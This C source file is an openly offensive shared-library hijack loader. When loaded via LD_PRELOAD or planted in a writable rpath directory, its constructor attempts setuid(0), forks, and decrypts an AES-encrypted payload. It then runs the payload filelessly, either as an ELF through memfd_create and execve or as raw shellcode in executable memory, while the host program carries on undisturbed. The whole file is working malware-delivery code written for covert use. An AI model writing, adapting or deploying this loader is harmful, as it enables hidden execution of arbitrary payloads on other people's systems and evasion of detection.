/*
 * hijack-lib.c — Shared-library hijack via constructor (AES payload)
 *
 * Constructor decrypts and executes AES-encrypted payload in a forked
 * child. Handles both raw shellcode and ELF binaries.
 * The host process continues normally.
 *
 * Usage:  LD_PRELOAD=./hijack-lib.so target_binary
 *         — or copy to a writable directory in the target's rpath/runpath
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <unistd.h>

#include "aes.h"
#include "shellcode.h"

extern char **environ;

static void payload(void) __attribute__((constructor));

void payload(void) {
    setuid(0);
    setgid(0);

    pid_t pid = fork();
    if (pid != 0)
        return; /* parent: host process continues */

    /* child: decrypt + exec payload */
    int pt_len = aes_decrypt_ecb(shellcode, shellcode_len, aes_key, shellcode);
    if (pt_len < 0)
        _exit(1);

    /* ELF binary: memfd + execve */
    if (pt_len >= 4 && shellcode[0] == 0x7f &&
        shellcode[1] == 'E' && shellcode[2] == 'L' && shellcode[3] == 'F') {
        int fd = syscall(SYS_memfd_create, "", 0);
        if (fd < 0)
            _exit(1);
        write(fd, shellcode, (size_t)pt_len);
        char fdpath[64];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
        unsetenv("LD_PRELOAD");
        execve(fdpath, (char *[]){"payload", NULL}, environ);
        _exit(1);
    }

    /* Raw shellcode: mmap RWX + jump */
    void *mem = mmap(NULL, (size_t)pt_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANON | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED)
        _exit(1);

    memcpy(mem, shellcode, (size_t)pt_len);
    ((void(*)())mem)();
    _exit(0);
}
